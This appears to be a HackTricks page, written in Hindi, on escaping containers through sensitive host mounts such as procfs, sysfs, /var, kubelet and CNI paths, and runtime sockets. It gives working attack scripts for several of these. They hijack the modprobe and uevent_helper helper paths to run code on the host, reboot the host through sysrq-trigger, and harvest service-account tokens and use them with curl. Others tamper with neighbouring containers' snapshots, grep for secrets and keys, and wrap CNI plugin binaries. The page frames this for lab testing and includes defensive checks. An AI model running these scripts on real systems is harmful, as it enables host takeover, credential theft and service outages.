# संवेदनशील होस्ट माउंट

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

होस्ट माउंट, कंटेनर से बच निकलने के सबसे महत्वपूर्ण व्यावहारिक रास्तों में से एक हैं, क्योंकि वे अक्सर सावधानी से अलग किए गए प्रोसेस-व्यू को वापस होस्ट के संसाधनों तक सीधी पहुंच में बदल देते हैं। खतरनाक मामले केवल `/` तक सीमित नहीं हैं। `/proc`, `/sys`, `/var`, runtime sockets, kubelet-प्रबंधित स्थिति या डिवाइस-संबंधित paths के bind mounts से kernel controls, credentials, पड़ोसी कंटेनरों के filesystems और runtime management interfaces उजागर हो सकते हैं।

यह पेज अलग-अलग सुरक्षा-पेजों से अलग इसलिए है, क्योंकि दुरुपयोग का मॉडल कई क्षेत्रों में फैला हुआ है। Writable host mount, कुछ हद तक mount namespaces, कुछ हद तक user namespaces, कुछ हद तक AppArmor या SELinux की कवरेज और कुछ हद तक उजागर किए गए सटीक host path के कारण खतरनाक होता है। इसे अलग विषय मानने से attack surface को समझना कहीं आसान हो जाता है।

हर कंटेनर के अंदर के संबंधित path से host-writable directory की तुलना भी करें। यदि इसे executable startup scripts वाली directory पर mount किया गया है, तो कम विशेषाधिकार वाला host user ऐसा code रख सकता है जिसे अधिक विशेषाधिकार वाला container entrypoint अगले restart पर लोड करे। सटीक bind source और destination, directory की write/search permissions, entrypoint loop और executable-file की आवश्यकता, runtime UID और restart का वास्तविक trigger सत्यापित करें। Container UID 0 अपने-आप host UID 0 नहीं होता; host पर इसका असर user-namespace mapping और mount policy तय करते हैं। Passive review में script लिखे या workload restart किए बिना paths और permissions की रिपोर्ट करें।

Linux container किसी management VM के भीतर हो सकता है, जो अलग Windows host filesystem के कुछ हिस्से साझा करता हो। [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) एक ऐसा तरीका है जिससे host files guest में दिखाई दे सकती हैं, लेकिन उस VM का root, Windows administrator से अलग पहचान है। यदि share में किसी पढ़ने योग्य user की SSH private key उजागर होती है, तो इसे credential का सुराग मानें: यह निष्कर्ष निकालने से पहले कि इससे host में login संभव है, host-backed सटीक mount, key का स्वामित्व और access, संबंधित account और Windows SSH server की **effective** authorized-key policy सत्यापित करें। आधुनिक [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) में administrator accounts के लिए आमतौर पर अलग `administrators_authorized_keys` file इस्तेमाल होती है। सामान्य enumeration output में private-key की सामग्री शामिल न करें; passive triage के लिए mount और key-path metadata पर्याप्त हैं।

## `/proc` का एक्सपोज़र

procfs में सामान्य process जानकारी के साथ-साथ प्रभावशाली kernel control interfaces भी होते हैं। इसलिए `-v /proc:/host/proc` जैसा bind mount या ऐसा container view, जो अप्रत्याशित writable proc entries उजागर करता है, जानकारी उजागर कर सकता है, सेवा से वंचित कर सकता है या सीधे host पर code execution का रास्ता दे सकता है।

procfs के महत्वपूर्ण paths में शामिल हैं:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (विशेषकर `register` और `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### दुरुपयोग

सबसे पहले जांचें कि procfs की कौन-सी महत्वपूर्ण entries दिखाई दे रही हैं या writable हैं:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

ये paths अलग-अलग कारणों से दिलचस्प हैं। Writable होने पर `core_pattern`, `modprobe`, और `binfmt_misc` host code-execution paths बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz` kernel exploitation के लिए शक्तिशाली reconnaissance sources हैं। `sched_debug` और `mountinfo` process, cgroup, और filesystem context दिखाते हैं, जो container के अंदर से host layout को फिर से समझने में मदद कर सकता है।

हर path का व्यावहारिक महत्व अलग है। इन सभी का impact समान मानने से triage कठिन हो जाता है:

- `/proc/sys/kernel/core_pattern`
  Writable होने पर, यह सबसे अधिक impact वाले procfs paths में से एक है, क्योंकि crash के बाद kernel एक pipe handler execute करेगा। अगर कोई container `core_pattern` को अपने overlay या किसी mounted host path में रखे payload की ओर point कर सकता है, तो अक्सर host code execution हासिल किया जा सकता है। एक समर्पित उदाहरण के लिए [read-only-paths.md](protections/read-only-paths.md) भी देखें।
- `/proc/sys/kernel/modprobe`
  यह path उस userspace helper को नियंत्रित करता है, जिसका इस्तेमाल kernel module-loading logic चलाने के लिए करता है। अगर यह container से writable हो और host context में interpret किया जाए, तो यह host code-execution का एक और primitive बन सकता है। यह तब खास तौर पर दिलचस्प होता है, जब helper path को trigger करने का कोई तरीका भी मौजूद हो।
- `/proc/sys/vm/panic_on_oom`
  आमतौर पर यह कोई साफ-सुथरा escape primitive नहीं है, लेकिन OOM conditions को kernel panic behavior में बदलकर memory pressure को host-wide denial of service में बदल सकता है।
- `/proc/sys/fs/binfmt_misc`
  अगर registration interface writable है, तो attacker चुनी हुई magic value के लिए handler register कर सकता है और matching file execute होने पर host context में execution हासिल कर सकता है।
- `/proc/config.gz`
  Kernel exploit triage के लिए उपयोगी। Host package metadata की ज़रूरत के बिना यह पता लगाने में मदद करता है कि कौन-से subsystems, mitigations, और optional kernel features enabled हैं।
- `/proc/sysrq-trigger`
  मुख्यतः denial-of-service path है, लेकिन बहुत गंभीर है। यह host को तुरंत reboot या panic कर सकता है, या अन्य तरीकों से बाधित कर सकता है।
- `/proc/kmsg`
  Kernel ring buffer messages दिखाता है। Host fingerprinting और crash analysis के लिए उपयोगी; कुछ environments में यह kernel exploitation के लिए मददगार जानकारी leak भी कर सकता है।
- `/proc/kallsyms`
  Readable होने पर उपयोगी है, क्योंकि यह exported kernel symbol information दिखाता है और kernel exploit development के दौरान address randomization से जुड़ी धारणाओं को निष्प्रभावी करने में मदद कर सकता है।
- `/proc/[pid]/mem`
  यह process-memory का सीधा interface है। अगर आवश्यक ptrace-style conditions के साथ target process तक पहुँचा जा सकता है, तो इससे किसी अन्य process की memory पढ़ी या बदली जा सकती है। वास्तविक impact credentials, `hidepid`, Yama, और ptrace restrictions पर बहुत निर्भर करता है, इसलिए यह शक्तिशाली लेकिन शर्तों पर निर्भर path है।
- `/proc/kcore`
  System memory का core-image-style view दिखाता है। यह file बहुत बड़ी और इस्तेमाल करने में असुविधाजनक है, लेकिन अगर इसे वास्तव में पढ़ा जा सकता है, तो यह host memory surface के गंभीर exposure का संकेत है।
- `/dev/kmem` और `/dev/mem`
  ये ऐतिहासिक रूप से high-impact raw-memory **device** interfaces हैं, procfs files नहीं। कई modern systems में ये मौजूद नहीं होते या इन पर कड़ी पाबंदियाँ होती हैं, लेकिन अगर कोई container host-mounted copy खोल सकता है, तो इस exposure को critical मानना चाहिए। इन्हें अन्य sensitive `/dev` mounts के साथ जाँचें; गैर-मौजूद `/proc/kmem` या `/proc/mem` paths को खोजने के बजाय।
- `/proc/sched_debug`
  Scheduling और task information leak करता है, जिससे host process identities उजागर हो सकती हैं, भले ही अन्य process views अपेक्षा से अधिक साफ़ दिखें।
- `/proc/[pid]/mountinfo`
  यह पता लगाने में बेहद उपयोगी है कि container वास्तव में host पर कहाँ स्थित है, कौन-से paths overlay-backed हैं, और क्या कोई writable mount host content से जुड़ा है या केवल container layer से।

अगर `/proc/[pid]/mountinfo` या overlay details पढ़ी जा सकती हैं, तो container filesystem का host path पता करने के लिए उनका इस्तेमाल करें:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

ये commands उपयोगी हैं, क्योंकि host पर execution की कई tricks के लिए container के अंदर के path को host के नज़रिए से उसके corresponding path में बदलना आवश्यक होता है।

### उदाहरण: `modprobe` Helper Path तैयार करना

अगर container से `/proc/sys/kernel/modprobe` writable है और helper path को host context में interpret किया जाता है, तो इसे attacker-controlled payload पर redirect किया जा सकता है। Overlay upper directory को host के नज़रिए से resolve होना चाहिए, और अगर container host `/tmp` को भी mount नहीं करता है, तो proof output को उसी host-visible container layer में वापस लिखा जाना चाहिए:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

सटीक trigger target और kernel के व्यवहार पर निर्भर करता है और इसका जानबूझकर अनुमान नहीं लगाया गया है। Lab से बाहर निकलने से पहले मूल value बहाल करें। अहम बात यह है कि writable helper path, भविष्य में kernel helper के invocation को attacker-controlled host-path content की ओर redirect कर सकता है। `upperdir` overlay का न होना, ऐसा path जिसे host resolve न कर सके, read-only sysctl mount, या ऐसा kernel जो चुने गए helper को कभी invoke न करे—इस chain को तोड़ देता है।

### पूरा उदाहरण: `kallsyms`, `kmsg` और `config.gz` के साथ Kernel Recon

अगर लक्ष्य तत्काल escape के बजाय exploitability का आकलन करना है:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

ये commands यह पता लगाने में मदद करते हैं कि उपयोगी symbol information दिखाई दे रही है या नहीं, हाल के kernel messages से कोई दिलचस्प स्थिति उजागर होती है या नहीं, और कौन-से kernel features या mitigations compile किए गए हैं। आमतौर पर इनका प्रभाव सीधे escape करने का नहीं होता, लेकिन ये kernel vulnerability की जाँच को काफी तेज़ कर सकते हैं।

### पूरा उदाहरण: SysRq से Host Reboot

अगर `/proc/sysrq-trigger` writable है और host view तक पहुँचता है:

```bash
echo b > /proc/sysrq-trigger
```

इसका प्रभाव तुरंत host reboot होना है। यह कोई सूक्ष्म उदाहरण नहीं है, लेकिन यह स्पष्ट रूप से दिखाता है कि procfs का exposure information disclosure से कहीं अधिक गंभीर हो सकता है।

## `/sys` Exposure

sysfs बड़ी मात्रा में kernel और device state को उजागर करता है। कुछ sysfs paths मुख्यतः fingerprinting के लिए उपयोगी होते हैं, जबकि अन्य helper execution, device behavior, security-module configuration या firmware state को प्रभावित कर सकते हैं।

अधिक महत्त्वपूर्ण sysfs paths में शामिल हैं:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

इन paths के महत्त्व के कारण अलग-अलग हैं। `/sys/class/thermal` thermal-management behavior को प्रभावित कर सकता है और इसलिए जिन environments में इसका exposure ठीक से नियंत्रित न हो, वहाँ host stability पर असर पड़ सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout की ऐसी जानकारी leak कर सकता है, जो low-level host fingerprinting में मदद करती है। `/sys/kernel/security` Linux Security Modules द्वारा उपयोग किया जाने वाला `securityfs` interface है, इसलिए वहाँ अप्रत्याशित access से MAC-संबंधित state उजागर या परिवर्तित हो सकती है। EFI variable paths firmware-समर्थित boot settings को प्रभावित कर सकते हैं, जिससे वे सामान्य configuration files से कहीं अधिक गंभीर हो जाते हैं। `/sys/kernel/debug` के अंतर्गत `debugfs` विशेष रूप से खतरनाक है, क्योंकि यह जानबूझकर developer-केंद्रित interface है और hardened, production-facing kernel APIs की तुलना में इसमें सुरक्षा संबंधी अपेक्षाएँ बहुत कम हैं।

इस सूची में मौजूद हर sysfs entry **kernel-, configuration- और hardware-dependent** है। मौजूदा virtualized nodes में अक्सर `uevent_helper`, EFI variables और thermal-device entries पूरी तरह अनुपस्थित होते हैं। अनुपस्थित path को negative prerequisite के रूप में दर्ज करें; यह न मानें कि किसी अन्य kernel का उदाहरण यहाँ भी लागू होगा।

इन paths की समीक्षा के लिए उपयोगी commands हैं:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

इन commands को दिलचस्प क्या बनाता है:

- `/sys/kernel/security` से पता चल सकता है कि AppArmor, SELinux या कोई अन्य LSM ऐसा दिखाई दे रहा है, जिसे केवल host तक सीमित रहना चाहिए था।
- `/sys/kernel/debug` इस समूह में अक्सर सबसे चिंताजनक finding होती है। अगर `debugfs` mount किया गया है और readable या writable है, तो kernel-facing surface के व्यापक होने की आशंका रखें; इसका सटीक जोखिम इस बात पर निर्भर करता है कि कौन-से debug nodes enabled हैं।
- EFI variable का exposure कम आम है, लेकिन अगर मौजूद हो, तो इसका प्रभाव गंभीर होता है, क्योंकि यह सामान्य runtime files के बजाय firmware-backed settings तक पहुँचता है।
- `/sys/class/thermal` मुख्य रूप से host की स्थिरता और hardware के साथ interaction के लिए प्रासंगिक है, न कि किसी आसान shell-style escape के लिए।
- `/sys/kernel/vmcoreinfo` मुख्य रूप से host की पहचान और crash analysis का स्रोत है, जो low-level kernel state को समझने में उपयोगी है।

### पूरा उदाहरण: `uevent_helper`

`/sys/kernel/uevent_helper` kernel और configuration पर निर्भर करता है और कई मौजूदा systems पर मौजूद नहीं होता। अगर यह मौजूद है, writable है, और कोई उपयोगी `uevent` trigger उपलब्ध है, तो kernel attacker-controlled helper चला सकता है। Proof output के लिए ऐसा path इस्तेमाल करना ज़रूरी है जो host और container, दोनों views से दिखाई दे:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

इसका काम करने का कारण यह है कि helper path की व्याख्या host के दृष्टिकोण से की जाती है। Trigger होने के बाद, helper मौजूदा container के अंदर नहीं, बल्कि host context में चलता है। `/sys/class/mem/null/uevent` उन kernels पर एक ठोस trigger है जो इसे expose करते हैं; अन्य devices अपनी `uevent` files expose कर सकते हैं, लेकिन वास्तविक hardware पर बिना सोचे-समझे कोई एक न चुनें। Lab छोड़ने से पहले मूल value बहाल करें। यदि helper file या नियंत्रित trigger उपलब्ध न हो, तो इस technique को उपलब्ध न बताएं।

## `/var` का Exposure

Host के `/var` को container में mount करने के जोखिम को अक्सर कम आंका जाता है, क्योंकि यह `/` को mount करने जितना नाटकीय नहीं दिखता। व्यवहार में, यह runtime sockets, container snapshot directories, kubelet द्वारा managed pod volumes, projected service-account tokens और आस-पास के application filesystems तक पहुँचने के लिए पर्याप्त हो सकता है। आधुनिक nodes पर, अक्सर `/var` में ही container की सबसे महत्वपूर्ण operational state मौजूद होती है।

### Kubernetes का उदाहरण

`hostPath: /var` वाला pod अक्सर दूसरे pods के projected tokens और overlay snapshot content पढ़ सकता है:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

ये कमांड यह पता लगाने में उपयोगी हैं कि mount से केवल सामान्य application data उजागर होता है या क्लस्टर के अत्यधिक संवेदनशील credentials। पढ़ा जा सकने वाला service-account token तुरंत local code execution को Kubernetes API तक पहुँच में बदल सकता है।

यदि token मौजूद है, तो केवल उसे ढूँढ़ने पर न रुकें—जाँचें कि उससे किन संसाधनों तक पहुँचा जा सकता है:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

यहाँ प्रभाव केवल local node access से कहीं अधिक बड़ा हो सकता है। व्यापक RBAC वाला token, mounted `/var` को पूरे cluster पर कब्ज़े का ज़रिया बना सकता है।

### Docker And containerd उदाहरण

Docker hosts पर संबंधित data अक्सर `/var/lib/docker` के अंतर्गत होता है, जबकि containerd-backed Kubernetes nodes पर यह `/var/lib/containerd` या snapshotter-specific paths में हो सकता है:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

यदि mounted `/var` किसी अन्य workload के writable snapshot contents को expose करता है, तो attacker मौजूदा container configuration को छुए बिना application files में बदलाव कर सकता है, web content रख सकता है, या startup scripts बदल सकता है।

**Disposable lab workload** पर, writable snapshot content से application tampering, secret recovery, या lateral movement का प्रदर्शन किया जा सकता है। पहले runtime container ID को सटीक snapshot से map करें और किसी असंबंधित या production snapshot को कभी edit न करें:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

ये commands उपयोगी हैं, क्योंकि ये mounted `/var` के प्रभाव की तीन मुख्य श्रेणियाँ दिखाते हैं: application tampering, secret recovery, और पड़ोसी workloads में lateral movement।

सीधे snapshot पर लिखने से runtime का सामान्य state management bypass हो सकता है और container corrupt हो सकता है या evidence नष्ट हो सकता है। Docker `overlay2` के विरुद्ध read-only discovery को स्थानीय रूप से दोहराया गया: पड़ोसी disposable container में लिखा गया marker `/var/lib/docker/overlay2/<id>/diff/` के नीचे दिखाई दिया। वास्तविक snapshot में बदलाव केवल इसी test के लिए बनाए गए disposable container तक सीमित रखें।

## Kubelet स्थिति, Plugins, और CNI पथ

`/var/lib/kubelet`, `/opt/cni/bin`, या `/etc/cni/net.d` का mount अक्सर privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, और storage helpers के ज़रिए exposed होता है। इन mounts को "node plumbing" कहकर नज़रअंदाज़ करना आसान है, लेकिन ये नए pods के execution path में सीधे मौजूद होते हैं और इनमें अक्सर kubelet credentials, projected secrets, registration sockets, और host-side plugin executables होते हैं।

अधिक महत्त्वपूर्ण targets में शामिल हैं:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

उपयोगी review commands हैं:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

ये paths क्यों महत्वपूर्ण हैं:

- `/var/lib/kubelet/pki` में kubelet client certificates और अन्य node-local credentials हो सकते हैं, जिन्हें cluster design के आधार पर कभी-कभी API server या kubelet-facing TLS endpoints के विरुद्ध दोबारा इस्तेमाल किया जा सकता है।<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` में अक्सर उसी node पर मौजूद अन्य pods के projected service-account tokens और mounted Secrets होते हैं।
- `/var/lib/kubelet/pod-resources/kubelet.sock` मुख्य रूप से reconnaissance surface है, लेकिन बहुत उपयोगी है: इससे पता चलता है कि वर्तमान में कौन-से pods और containers GPUs, hugepages, SR-IOV devices और अन्य दुर्लभ node-local resources का उपयोग कर रहे हैं।<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, और `/var/lib/kubelet/plugins_registry` से पता चलता है कि कौन-से CSI, DRA और device plugins इंस्टॉल हैं और kubelet को किन sockets से बात करनी है। अगर ये directories केवल readable होने के बजाय writable हैं, तो यह finding कहीं अधिक गंभीर हो जाती है।<sup>[[1]](#references)</sup>
- `/opt/cni/bin` और `/etc/cni/net.d` सीधे pod-network setup path पर मौजूद हैं। वहाँ writable access अक्सर केवल configuration exposure न होकर, देरी से मिलने वाला host-execution primitive होता है।<sup>[[2]](#references)</sup>

### पूरा उदाहरण: Writable `/opt/cni/bin`

अगर host CNI binary directory read-write mode में mount की गई है, तो किसी plugin को बदलना उस node पर अगली बार kubelet द्वारा pod sandbox बनाए जाने पर host execution पाने के लिए पर्याप्त हो सकता है:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

यह mounted `docker.sock` जितना तात्कालिक नहीं है, लेकिन compromised Kubernetes infrastructure pods में अक्सर अधिक वास्तविक होता है। marker को mounted plugin के बगल में लिखा जाता है, ताकि container उसे host-root या host-`/tmp` mount के बिना भी प्राप्त कर सके। wrapper मूल arguments और standard input को बनाए रखता है, फिर उदाहरण मूल binary को restore करता है। महत्वपूर्ण बात यह है कि modified binary को बाद में host network setup flow execute करता है, न कि मौजूदा container। केवल disposable node का उपयोग करें, क्योंकि invalid wrapper नए Pod sandboxes को networking मिलने से रोक सकता है।

## Runtime Sockets

संवेदनशील host mounts में अक्सर पूरी directories के बजाय runtime sockets शामिल होते हैं। ये इतने महत्वपूर्ण हैं कि यहाँ इनका स्पष्ट रूप से दोहराया जाना चाहिए:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

इनमें से कोई socket mount होने के बाद, exploitation के पूरे flows के लिए [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें।

पहली interaction के लिए एक त्वरित pattern:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

यदि इनमें से कोई सफल होता है, तो "mounted socket" से "अधिक privileged sibling container शुरू करने" तक का रास्ता आमतौर पर किसी भी kernel breakout path से बहुत छोटा होता है।

उसी daemon access से **host persistence** भी स्थापित की जा सकती है। writable host-root bind mount वाला helper container `docker cp` के ज़रिए files प्राप्त कर सकता है, फिर `docker exec` का इस्तेमाल करके mounted host path के तहत SSH key, service unit या कोई अन्य persistence file रख सकता है। सुरक्षा सीमा daemon का host mount बनाने का अधिकार है; `docker cp` केवल staging का एक चरण है। Runtime socket expose होने के बाद, नए बनाए गए containers और host authentication या startup paths पर लिखी गई files—दोनों का audit करें।

## Writable Host Path Task Hijack

खतरनाक होने के लिए writable host mount का `/` expose करना ज़रूरी नहीं है। यदि mounted path में ऐसे scripts, config files, hooks, plugins या files हों जिन्हें बाद में host-side scheduled task या service इस्तेमाल करती है, तो container host द्वारा execute की जाने वाली चीज़ को बदल सकता है।

सामान्य review flow:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

यदि host process किसी writable file का उपयोग करता है, तो परीक्षण के दौरान payload को सरल और observable रखें:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

दिलचस्प पहलू trust boundary है: write container के अंदर से होता है, लेकिन execution बाद में host service context में होता है। इससे एक सीमित hostPath या bind mount, host पर code execution के लिए delayed primitive बन जाता है।

## साझा Host Path पर Root-Owned Files

जिस container account के पास root बनने की क्षमता है, वह किसी writable path पर root-owned file रख सकता है, जिसका इस्तेमाल host भी करता हो। अगर container UID 0, host UID 0 से map होता है और host mount SUID execution की अनुमति देता है, तो उस path पर root-owned SUID executable चला सकने वाला host user, host privilege boundary पार कर सकता है। इस खास file-ownership समस्या के लिए container को `--privileged` के साथ चलाना ज़रूरी नहीं है। अलग-अलग शर्तों के लिए [user namespace mappings](protections/namespaces/user-namespace.md) और [SUID discussion](privileged-containers.md) देखें।

Path की समीक्षा **दोनों तरफ़ से** करें: किसी benign file का ownership और identity तुलना करें, container के `uid_map` और `gid_map` जाँचें, और host के mount options तथा execution policy का निरीक्षण करें। Container की तरफ़ `nosuid` के बिना `rw` होना सिर्फ़ एक संभावित संकेत है; इससे host ownership, host mount flags, host user की access, या यह साबित नहीं होता कि AppArmor/SELinux execution को रोकता है या नहीं। `noexec` उस view में execution को सीमित करता है जहाँ यह लागू होता है। `/proc/self/mountinfo` में `shared:` और `master:` tags mount propagation बताते हैं, यह नहीं कि file का content host के साथ साझा है या नहीं। किसी bind mount में ये tags न भी हों। Host login देने वाला credential reuse, shared-file privilege boundary से अलग चरण है।

Explicit bind mount के बिना भी host का runtime storage ऐसा ही path बना सकता है। [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) ने unprivileged host user को Docker data subdirectories में जाने और container filesystem से files execute करने की अनुमति दी थी; Moby ने 20.10.9 में permissions ठीक कीं और बताया कि directories को सुधारने के लिए चल रहे containers को restart करना होगा। `overlay2/<id>/merged` के सटीक mounted paths और हर parent की search permission जाँचें, फिर पुष्टि करें कि container UID 0, host UID 0 से map होता है या नहीं, कोई वास्तविक root-owned SetUID executable मौजूद और पहुँच योग्य है या नहीं, और host view SetUID execution की अनुमति देता है या नहीं। Rootless या user-namespace-remapped containers, `nosuid`, `noexec`, `no_new_privs`, और MAC policy नतीजा बदल सकते हैं। Runtime version या traversable path अकेले host-root execution का प्रमाण नहीं हैं; किसी संभावित executable को चलाए बिना mount और file metadata का निरीक्षण करें।

## Mount-Related CVEs

Host mounts का runtime vulnerabilities से भी संबंध है। हाल के महत्वपूर्ण उदाहरण:

- `runc` में `CVE-2024-21626`, जहाँ leaked directory file descriptor के कारण working directory host filesystem पर सेट हो सकती थी।
- BuildKit में `CVE-2024-23651`, `CVE-2024-23652`, और `CVE-2024-23653`, जहाँ malicious Dockerfiles, frontends, और `RUN --mount` flows builds के दौरान host file access, deletion, या elevated privileges को फिर से संभव बना सकते थे।
- Buildah और Podman build flows में `CVE-2024-1753`, जहाँ build के दौरान crafted bind mounts, `/` को read-write के रूप में उजागर कर सकते थे।
- `containerd` 2.1.0 में `CVE-2025-47290`, जहाँ image unpack के दौरान TOCTOU के कारण specially crafted image, pull के दौरान host filesystem को modify कर सकती थी।

ये CVEs यहाँ इसलिए मायने रखते हैं क्योंकि ये दिखाते हैं कि mount handling सिर्फ़ operator configuration तक सीमित नहीं है। Runtime खुद भी mount-driven escape conditions पैदा कर सकता है।

## जाँच

सबसे अहम mount exposures जल्दी ढूँढने के लिए इन commands का इस्तेमाल करें:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

यहाँ क्या दिलचस्प है:

- Host root, `/proc`, `/sys`, `/var`, और runtime sockets सभी उच्च-प्राथमिकता वाली findings हैं।
- Writable proc/sys entries का अक्सर मतलब होता है कि mount सुरक्षित container view के बजाय host-global kernel controls को expose कर रहा है।
